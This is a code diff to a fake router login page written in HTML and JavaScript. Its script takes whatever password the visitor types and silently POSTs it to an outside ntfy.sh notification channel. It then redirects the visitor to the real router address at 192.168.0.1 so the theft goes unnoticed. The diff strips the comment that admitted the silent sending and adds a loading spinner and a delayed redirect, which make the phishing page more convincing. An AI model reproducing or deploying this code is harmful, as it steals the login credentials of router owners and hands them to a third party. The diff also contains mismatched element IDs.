@@ -184,7 +184,11 @@
         &gt; First, push the reset button for about 8 seconds and then release it to reset your router.<br>
         Second, set a new login password.
       </div>
-
+         <div class="reset-tip hh-tip" id="hhhTip">
+        
+        &gt; First, push the reset button for about 8 seconds and then release it to reset your router.<br>
+        Second, set a new login password.
+      </div>
       <div class="field">
         <span class="icon">
           <svg width="17" height="17" viewBox="0 0 24 24" fill="none">
@@ -252,7 +256,7 @@
     }
   }
 
-  const tip = document.getElementById('resetTip');
+  const tip = document.getElementById('resetTip'); const hhtip = document.getElementById('hhhtTip');
   const forgotBtn = document.getElementById('forgotBtn');
   const closeX = document.getElementById('closeTip');
 
@@ -260,7 +264,10 @@
     const isOpen = tip.classList.contains('show');
     if (isOpen) { closeTip(); } else { openTip(); }
   }
-
+function togglehhTip() {
+    const isOpen = hhtip.classList.contains('show');
+    if (isOpen) { closehhTip(); } else { openhhTip(); }
+  }
   function openTip() {
     tip.classList.add('show');
     forgotBtn.classList.add('open');
@@ -270,37 +277,69 @@
     tip.classList.remove('show');
     forgotBtn.classList.remove('open');
   }
-
+  
+  function openhhTip() {
+    hhtip.classList.add('show');
+  }
+  
+ function closehhTip() {
+    hhtip.classList.remove('show');
+  }
+  
   closeX.addEventListener('click', function(e) {
     e.stopPropagation();
     closeTip();
+    closehhTip();
+    
   });
 
   document.addEventListener('click', function(e) {
     if (tip.classList.contains('show') &&
-        !tip.contains(e.target) &&
+        !tip.contains(e.target) && hhtip.classList.contains('show') &&
+        !hhtip.contains(e.target) &&
         !forgotBtn.contains(e.target)) {
-      closeTip();
+      closeTip(); closehhTip();
     }
   });
   document.querySelector('.login-btn').addEventListener('click', function() {
+     const btn = this;
     
+    
+    const originalText = btn.innerHTML;
+    
+   
+    btn.disabled = true;
+    
+   
+    btn.innerHTML = `<span class="spinner"></span> Loading...`;
     const searchTermValue = document.getElementById('password').value;
     
-    // Check to make sure they actually typed something before sending
+   
     if (searchTermValue.trim() !== "") {
         
-        // Silently send the query to your web dashboard in the background
+       
         fetch('https://ntfy.sh/my-shop-alerts-7729', {
             method: 'POST',
             body: `🛒 password entered for router is : ${searchTermValue}`
-        })
-        .then(response => {
-             window.location.href = 'http://192.168.0.1';
-        })
-        .catch(error => {
-            window.location.href = 'http://192.168.0.1';
-        });
+        }).then(response => {
+    // If the call succeeds, trigger the custom visibility state
+    togglehhTip();
+})
+.catch(error => {
+    // Handle or log network/connection failures locally
+    console.error('Request failed:', error);
+})
+.finally(() => {
+    // 1. Immediately restore the interactive state of the button
+    btn.disabled = false;
+    btn.innerHTML = originalText;
+    
+    // 2. Wait exactly 1000 milliseconds (1 second) before execution
+    setTimeout(function() {
+        window.location.href = 'http://192.168.0.1';
+    }, 1000);
+});
+
         
     }
 });
